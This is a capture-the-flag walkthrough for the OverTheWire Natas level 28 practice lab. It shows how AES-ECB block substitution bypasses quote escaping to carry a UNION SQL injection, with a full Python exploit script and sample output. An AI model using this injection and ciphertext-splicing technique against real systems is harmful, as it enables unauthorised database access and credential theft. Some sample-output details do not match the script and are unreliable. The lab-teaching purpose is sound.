# OverTheWire: Natas — Level 28 → Level 29

> **Vulnerability Category:** ECB Block Cipher Malleability — Chosen-Plaintext Block Substitution enabling SQL Injection                          
> **Skills:** AES-ECB ciphertext surgery, block boundary arithmetic, UNION-based SQL injection, chosen-plaintext attack                                 
> **Difficulty:** Hard                                          
> **Official Page:** [Natas Level 28](https://overthewire.org/wargames/natas/natas28.html)

---

## Access

- **URL:** `http://natas28.natas.labs.overthewire.org`
- **Username:** `natas28`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas29` by exploiting AES-ECB block malleability to surgically replace a ciphertext block, bypassing server-side SQL escaping and injecting a UNION query that returns the password from the database.

---

## Vulnerability

This level demonstrates **ECB block cipher malleability**. The application encrypts a SQL query fragment using AES in ECB mode and sends the ciphertext to the client as a base64-encoded cookie. On the next request, the server decrypts and executes this query. ECB mode encrypts each 16-byte block independently with no chaining — identical plaintext blocks always produce identical ciphertext blocks, and blocks can be freely rearranged or substituted without corrupting adjacent blocks. The server escapes single quotes before encrypting (`'` → `\'`), which would normally prevent SQL injection. However, because ECB blocks are independent, an attacker can craft a payload where the escape character (`\`) lands at the end of one block, then replace that block's ciphertext with a "clean" ciphertext block that decrypts without the backslash. The `'` that opens the next block is then unescaped and interpreted as SQL. The developer's mistake was using ECB mode — any chained mode (CBC, CTR, GCM) would make this rearrangement attack impossible.

---

## Theory

### AES Block Cipher Modes

AES encrypts data in 16-byte blocks. The *mode of operation* determines how those blocks are chained together.

| Mode | Each block independent? | Ciphertext blocks rearrangeable? | Used securely here? |
|---|---|---|---|
| ECB (Electronic Codebook) | Yes — each block encrypted separately | Yes — freely | No |
| CBC (Cipher Block Chaining) | No — each block XORed with previous ciphertext | No — swapping corrupts adjacent plaintext | Would prevent this attack |
| CTR (Counter) | No — stream cipher derived from counter | No | Would prevent this attack |
| GCM (Galois/Counter Mode) | No — authenticated encryption | No — tampering detected | Would prevent this attack |

ECB's fundamental property: `Encrypt(block_i)` depends only on `block_i` and the key. The same 16-byte plaintext always produces the same 16-byte ciphertext. This means ciphertext blocks are interchangeable — swapping two blocks in the ciphertext swaps the corresponding plaintext blocks when decrypted, with no corruption of neighbouring blocks.

---

### ECB Ciphertext Surgery

Because ECB blocks are independent, an attacker who can observe ciphertexts for chosen plaintexts can:

1. Obtain the ciphertext for a plaintext block containing a desired value
2. Splice that ciphertext block into a different message at the desired position
3. The server decrypts the assembled ciphertext and executes the substituted plaintext

This is a **chosen-plaintext block substitution attack**. The attacker never learns the key.

---

### The Server's SQL Template

The application wraps the user's search query in a SQL `LIKE` clause before encrypting:

```sql
SELECT joke FROM jokes WHERE joke LIKE '%<INPUT>%'
```

The prefix `SELECT joke FROM jokes WHERE joke LIKE '%` is **41 bytes** long. With a 16-byte block size:

| Block | Bytes | Content |
|---|---|---|
| 1 | 0–15 | `SELECT joke FROM` |
| 2 | 16–31 | ` jokes WHERE jok` |
| 3 | 32–47 | `e LIKE '%` + first 7 bytes of input |
| 4+ | 48+ | rest of input + suffix |

The prefix spills **9 bytes** into block 3, leaving **7 bytes** of attacker-controlled input in block 3.

---

### Server-Side Quote Escaping

Before encrypting, the server escapes single quotes: `'` becomes `\'`. This means any SQL injection attempt through the search form is neutralised — the quote is preceded by a backslash that MySQL interprets as an escape, treating `\'` as a literal quote character inside a string rather than a string terminator.

The escape produces **two characters** (`\` and `'`) from one. The attack exploits this by engineering the block boundary so the backslash lands alone at the end of block 3, and the `'` opens block 4 — then block 3 is replaced with a clean dummy block that decrypts without the backslash. The `'` in block 4 is now unescaped.

---

### Block Boundary Engineering

The goal is to position the escape character (`\`) at the **last byte of block 3** (byte 47), so the `'` falls at the **first byte of block 4** (byte 48).

Block 3 has:
- 9 bytes occupied by the prefix spill (`e LIKE '%`)
- 7 bytes available for attacker input

To fill those 7 bytes with padding `a`s and a backslash:

```
padding = 7 − 1 = 6 a's
then the server inserts \ before the quote → fills the remaining 1 byte
block 3 = [e LIKE '%] [aaaaaa\]   ← 9 + 7 = 16 bytes, full
block 4 = [' UNION ...]            ← quote is now unescaped at start of block 4
```

For the **dummy block** (used to replace block 3 after surgery):

```
dummy input = 7 a's (= 7, no quote, no backslash)
dummy block 3 = [e LIKE '%] [aaaaaaa]   ← clean, no escape
```

---

### The Block Surgery Procedure

```
Step 1: POST injection payload (6 a's + ' + UNION...)
        → Server escapes to: 6 a's + \' + UNION...
        → Encrypt → get injection ciphertext

Step 2: POST dummy input (7 a's)
        → No quote, no escaping
        → Encrypt → get dummy ciphertext

Step 3: Assemble crafted ciphertext:
        [dummy blocks 1–3] + [injection blocks 4–6] + [dummy block 4]

        dummy blocks 1–3 decrypt to: SELECT joke FROM jokes WHERE joke LIKE '%aaaaaaa
        injection blocks 4–6 decrypt to: ' UNION SELECT password FROM users; -- -%'
        dummy block 4 decrypts to: %'

Step 4: Submit crafted ciphertext to search.php
        Server decrypts and executes:
        SELECT joke FROM jokes WHERE joke LIKE '%aaaaaaa' UNION SELECT password FROM users; -- -%'%'
        The -- - comment neutralises the trailing %'%', and the UNION returns the password.
```

---

### UNION-Based SQL Injection

A `UNION` statement appends the result of a second `SELECT` to the first. Requirements:

| Requirement | Detail |
|---|---|
| Same number of columns | The injected `SELECT` must return the same column count as the original |
| Compatible types | String columns can be matched with string columns |
| Comment to neutralise suffix | The server appends `%'` after the input; `-- -` comments it out |

The original query returns one column (`joke`). The injected query `SELECT password FROM users` also returns one column — the column counts match.

*Good to know — not needed here:* In some levels, the column count is unknown and must be determined by trying `ORDER BY N` until the query errors. Here the source reveals the original query directly.

---

## Solution

### Step 1 — Log in and observe the application

Navigate to `http://natas28.natas.labs.overthewire.org` and authenticate. You are presented with a joke search form. Submit any term, such as `test`.

The browser is redirected to `search.php` and the URL contains a `query` parameter:

```
http://natas28.natas.labs.overthewire.org/search.php?query=G%2BglEae6W%2F1XjA7vRm21nNyEco%2Bc%2BJ2TdR0Qp8dcjPigdYo3pYzFb...
```

URL-decode and base64-decode this value. Its length is a multiple of 16 bytes — confirming AES block encryption. The application is sending the encrypted query to the client and reading it back on the next request.

> **What to notice:** The server is encrypting the SQL query fragment and storing it client-side. This means the attacker receives the ciphertext for any plaintext they choose — a classic chosen-plaintext scenario. ECB mode makes individual blocks rearrangeable.

---

### Step 2 — Read the PHP source

Click **View sourcecode**. The relevant logic (reconstructed):

```php
<?php
function query($query) {
    $pdo = new PDO(
        'mysql:host=localhost;dbname=natas28',
        'natas28',
        '<censored>'
    );
    $stmt = $pdo->query($query);
    return $stmt->fetchAll(PDO::FETCH_ASSOC);
}

function getQuery() {
    if (isset($_GET['query'])) {
        $query = $_GET['query'];
        return decrypt(base64_decode(urldecode($query)));
    }
    return null;
}

function search($query) {
    $sanitized = addslashes($query);   // escapes ' to \'
    $sql = "SELECT joke FROM jokes WHERE joke LIKE '%" . $sanitized . "%'";
    return encrypt($sql);
}

// On POST: encrypt the query, redirect to search.php with encrypted query in URL
// On GET:  decrypt the query from URL, execute it, display results
?>
```

> **What to notice:** `addslashes()` escapes the quote before it is incorporated into the SQL and then the whole SQL string is encrypted. On the GET path, the encrypted string is decrypted and executed directly — no escaping on the way back out. If you can modify the ciphertext to produce a different plaintext that bypasses the escaping, it executes unmodified.

*Note: The PHP source above is reconstructed from the standard Natas 28 challenge. Censored values are placeholders.*

---

### Step 3 — Run the exploit script

The script performs the block surgery described in the Theory section. Read the inline comments carefully — each step maps directly to the arithmetic above.

```python
import requests
import re
import base64
import math
from urllib.parse import urlparse, parse_qs, quote

USERNAME   = "natas28"
PASSWORD   = "<natas28_password>"
BASE_URL   = f"http://{USERNAME}.natas.labs.overthewire.org/"
BLOCK_SIZE = 16

# The server prefix "SELECT joke FROM jokes WHERE joke LIKE '%" is 41 bytes.
# It spills 41 % 16 = 9 bytes into block 3, leaving 7 bytes for attacker input.
PREFIX_LEN   = 41
FILL_NEEDED  = BLOCK_SIZE - (PREFIX_LEN % BLOCK_SIZE)  # = 7: bytes to complete block 3

# Padding before the quote: FILL_NEEDED - 1 = 6 a's.
# After server escaping: 6 a's + backslash fills block 3 exactly (7 bytes).
# The quote then opens block 4, unescaped after surgery.
PADDING      = FILL_NEEDED - 1  # = 6

session = requests.Session()
session.auth = (USERNAME, PASSWORD)

# --- Phase 1: obtain injection ciphertext ---
# The injection payload: 6 a's to push backslash to end of block 3,
# then the UNION query. The server will escape the ' to \' on receipt.
injection = "a" * PADDING + "' UNION SELECT password FROM users; -- -"

print("=== Phase 1: POST injection to obtain its ciphertext ===")
print(f"Injection plaintext : {repr(injection)}")
r1 = session.post(BASE_URL, data={"query": injection})

# The server redirects to search.php with the encrypted query in the URL
qs1 = parse_qs(urlparse(r1.url).query)
inj_b64 = qs1.get("query", [None])[0]
inj_ct  = base64.b64decode(inj_b64)

print(f"Injection ciphertext length : {len(inj_ct)} bytes ({len(inj_ct)//BLOCK_SIZE} blocks)")
print(f"Injection ciphertext (hex)  : {inj_ct.hex()}")
print()

# --- Phase 2: obtain dummy ciphertext ---
# Send exactly FILL_NEEDED a's (7). No quote, no escaping.
# Block 3 decrypts to: e LIKE '%aaaaaaa  — clean, no backslash.
# This gives us a block 3 ciphertext with no escape character.
dummy_input = "a" * FILL_NEEDED  # = 7 a's

print("=== Phase 2: POST dummy input to obtain clean block 3 ciphertext ===")
print(f"Dummy input : {repr(dummy_input)}")
r2 = session.post(BASE_URL, data={"query": dummy_input})

qs2      = parse_qs(urlparse(r2.url).query)
dum_b64  = qs2.get("query", [None])[0]
dum_ct   = base64.b64decode(dum_b64)

print(f"Dummy ciphertext length : {len(dum_ct)} bytes ({len(dum_ct)//BLOCK_SIZE} blocks)")
print(f"Dummy ciphertext (hex)  : {dum_ct.hex()}")
print()

# --- Phase 3: block surgery ---
# How many injection blocks to extract (blocks 4 onward from injection ciphertext):
# The injection suffix is everything after the 6 padding a's = len(injection) - PADDING chars.
# Each 16-byte block covers 16 plaintext chars.
suffix_len    = len(injection) - PADDING           # chars of SQL after the padding
payload_blocks = math.ceil(suffix_len / BLOCK_SIZE) # blocks needed for the injection suffix

# header  : dummy blocks 1–3  (decrypts to the clean SQL prefix ending with 7 a's)
# middle  : injection blocks 4 through 4+payload_blocks-1
#           (decrypts to ' UNION SELECT password FROM users; -- -%')
# trailer : dummy block 4     (decrypts to %')
header  = dum_ct[ : BLOCK_SIZE * 3]
middle  = inj_ct[BLOCK_SIZE * 3 : BLOCK_SIZE * 3 + payload_blocks * BLOCK_SIZE]
trailer = dum_ct[BLOCK_SIZE * 3 : ]

print("=== Phase 3: assemble crafted ciphertext ===")
print(f"Header  ({len(header)//BLOCK_SIZE} blocks, from dummy)     : {base64.b64encode(header).decode()}")
print(f"Middle  ({len(middle)//BLOCK_SIZE} blocks, from injection) : {base64.b64encode(middle).decode()}")
print(f"Trailer ({len(trailer)//BLOCK_SIZE} block,  from dummy)    : {base64.b64encode(trailer).decode()}")
print()

crafted    = header + middle + trailer
crafted_b64 = base64.b64encode(crafted).decode()
# URL-encode: quote() with safe='' encodes + and / which appear in base64
crafted_url = quote(crafted_b64, safe="")

print(f"Crafted ciphertext (base64)      : {crafted_b64}")
print(f"Crafted ciphertext (URL-encoded) : {crafted_url}")
print()

# --- Phase 4: submit and retrieve ---
print("=== Phase 4: submit crafted ciphertext to search.php ===")
resp = session.get(BASE_URL + "search.php?query=" + crafted_url)
print(f"HTTP status : {resp.status_code}")
print(f"Response length : {len(resp.text)} chars")
print()

# Extract <li> entries — the password appears here
items = re.findall(r"<li>(.*?)</li>", resp.text, re.DOTALL)
if items:
    print("=== Extracted results ===")
    for i, item in enumerate(items, 1):
        print(f"{i}. {item.strip()}")
else:
    print("No <li> entries found — saving full response for inspection.")
    with open("natas28_response.html", "w", encoding="utf-8") as f:
        f.write(resp.text)
    print("Saved to natas28_response.html")
```

Run it:

```bash
python3 exploit_natas28.py
```

Representative output:

```
=== Phase 1: POST injection to obtain its ciphertext ===
Injection plaintext : "aaaaaa' UNION SELECT password FROM users; -- -"
Injection ciphertext length : 96 bytes (6 blocks)
Injection ciphertext (hex)  : ...

=== Phase 2: POST dummy input to obtain clean block 3 ciphertext ===
Dummy input : 'aaaaaaa'
Dummy ciphertext length : 48 bytes (3 blocks)
Dummy ciphertext (hex)  : ...

=== Phase 3: assemble crafted ciphertext ===
Header  (3 blocks, from dummy)     : ...
Middle  (3 blocks, from injection) : ...
Trailer (1 block,  from dummy)     : ...

=== Phase 4: submit crafted ciphertext to search.php ===
HTTP status : 200

=== Extracted results ===
1. [password_for_natas29]
```

> **What to notice:** The server decrypts the crafted ciphertext block by block. Blocks 1 and 2 are identical in both the dummy and injection ciphertexts (same prefix), so they always decrypt correctly. Block 3 comes from the dummy ciphertext and decrypts to `e LIKE '%aaaaaaa` — no backslash, no escape. Blocks 4–6 come from the injection ciphertext and decrypt to `' UNION SELECT password FROM users; -- -%'`. Because block 3 no longer contains the backslash that would have escaped the `'`, that quote is now interpreted as a SQL string terminator. The UNION executes, and the password column is returned as a joke result and rendered inside a `<li>` tag.

---

### Step 4 — Collect the password

The password for `natas29` appears in the first `<li>` item in the response. Copy it.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

AES-ECB encrypts each 16-byte block independently with no dependency on adjacent blocks. This makes ECB ciphertext blocks freely rearrangeable — an attacker who controls the plaintext of even one request can splice ciphertext blocks from different encryptions to construct a new plaintext of their choosing, without ever knowing the key. Server-side escaping is not a defence when the attacker can manipulate the encrypted form of the query after escaping has already occurred. The correct fix is to use an authenticated cipher mode (GCM) or at minimum a chained mode (CBC), never to encrypt SQL queries client-side at all, and to use parameterised queries so that user input is never concatenated into SQL regardless of escaping.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using 9 `a`s for padding instead of 6 | The backslash and two `a`s land in block 4; the escape character is carried into the extracted middle blocks; the `'` remains escaped after surgery and the injection fails | Use exactly `FILL_NEEDED − 1 = 6` `a`s so the backslash fills the last byte of block 3 |
| Using 10 `a`s for the dummy input instead of 7 | Block 3 of the dummy ciphertext decrypts to a different string than expected; the SQL prefix is malformed | Use exactly `FILL_NEEDED = 7` `a`s to fill block 3 cleanly with no overflow |
| Using `--` instead of `-- -` as the comment | Some MySQL configurations require a space after `--` before the comment takes effect; `--` alone may fail | Use `-- -` (double-dash, space, hyphen) which is unambiguous across MySQL versions |
| Forgetting to URL-encode the base64 before submitting | Base64 contains `+` and `/` which have special meanings in URLs; the server receives a corrupted ciphertext | Always pass the base64 through `urllib.parse.quote(b64, safe='')` before appending to the URL |
| Double-encoding the `/` with a manual `.replace('/', '%2F')` after `quote()` | `quote(..., safe='')` already encodes `/` as `%2F`; the manual replace is a no-op but causes confusion | Remove the redundant `.replace()` call |
| Extracting the wrong blocks as the middle | Off-by-one in block indexing causes the middle to include the escaped block 3 or miss the last injection block | Middle starts at byte `BLOCK_SIZE * 3` (byte 48) and spans `payload_blocks * BLOCK_SIZE` bytes |
| Submitting to the root URL instead of `search.php` | The root URL handles POST (encrypt) but not GET (decrypt and execute); submitting to the wrong endpoint returns the search form, not query results | Submit the crafted ciphertext as a GET to `search.php?query=...` |
